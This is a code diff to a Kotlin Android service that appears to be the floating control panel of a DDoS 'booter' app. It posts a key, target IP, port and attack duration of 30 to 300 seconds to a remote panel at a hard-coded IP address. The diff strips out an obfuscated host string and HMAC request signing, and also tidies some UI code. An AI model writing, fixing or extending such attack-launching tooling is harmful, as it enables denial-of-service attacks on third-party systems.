@@ -19,8 +19,6 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.concurrent.Executors
-import javax.crypto.Mac
-import javax.crypto.spec.SecretKeySpec
 
 class FloatingService : Service() {
 
@@ -55,19 +53,8 @@ class FloatingService : Service() {
         const val MAX_ATTACK_SECONDS = 300
         const val MIN_ATTACK_SECONDS = 30
         
-        private fun getDecryptedHost(): String {
-            return "OTdMSUxESENMRUxNRUxN".let { enc ->
-                val raw = android.util.Base64.decode(enc, android.util.Base64.NO_WRAP)
-                raw.map { ((it.toInt() xor 0x5A) and 0xFF).toChar() }.joinToString("")
-            }
-        }
-
-        private fun generateHMAC(jsonString: String): String {
-            val key = "SPECTRE_SECURE_2026"
-            val mac = Mac.getInstance("HmacSHA256")
-            mac.init(SecretKeySpec(key.toByteArray(), "HmacSHA256"))
-            return mac.doFinal(jsonString.toByteArray()).joinToString("") { String.format("%02x", it) }
-        }
+        // 🩸 SEEDHA URL (No Encryption)
+        private const val PANEL_URL = "http://13.211.179.172:5000"
         
         val attackExecutor = Executors.newSingleThreadExecutor()
 
@@ -84,9 +71,7 @@ class FloatingService : Service() {
 
     private fun playSound(type: String) {
         try {
-            if (toneGenerator == null) {
-                toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
-            }
+            if (toneGenerator == null) toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
             when (type) {
                 "click" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_BEEP, 50)
                 "success" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_ACK, 150)
@@ -230,7 +215,7 @@ class FloatingService : Service() {
         slotsThread = Thread {
             while (true) {
                 try {
-                    val url = URL("http://${getDecryptedHost()}:5000/connect/slots")
+                    val url = URL("$PANEL_URL/connect/slots")
                     val conn = url.openConnection() as HttpURLConnection
                     conn.requestMethod = "GET"
                     conn.connectTimeout = 3000; conn.readTimeout = 3000
@@ -267,7 +252,7 @@ class FloatingService : Service() {
                     return@execute
                 }
 
-                val url = URL("http://${getDecryptedHost()}:5000/connect/action")
+                val url = URL("$PANEL_URL/connect/action")
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.doOutput = true
@@ -278,7 +263,6 @@ class FloatingService : Service() {
                     put("key", key); put("ip", ip); put("port", port); put("time", durationSec)
                 }.toString()
 
-                conn.setRequestProperty("X-App-Signature", generateHMAC(body))
                 conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
 
                 val code = conn.responseCode
@@ -394,16 +378,13 @@ class FloatingService : Service() {
     private var initialX = 0; private var initialY = 0
     private var initialTouchX = 0f; private var initialTouchY = 0f
 
-    // 🩸 FIXED: Resize Handle hata diya, sirf Drag bacha hai
     private fun setupPanelDragAndResize() {
         val header = floatingView.findViewById<LinearLayout>(R.id.headerLayout)
         header.setOnTouchListener { _, event ->
             when (event.action) {
                 MotionEvent.ACTION_DOWN -> {
-                    initialX = paramsPanel.x
-                    initialY = paramsPanel.y
-                    initialTouchX = event.rawX
-                    initialTouchY = event.rawY
+                    initialX = paramsPanel.x; initialY = paramsPanel.y
+                    initialTouchX = event.rawX; initialTouchY = event.rawY
                     true
                 }
                 MotionEvent.ACTION_MOVE -> {
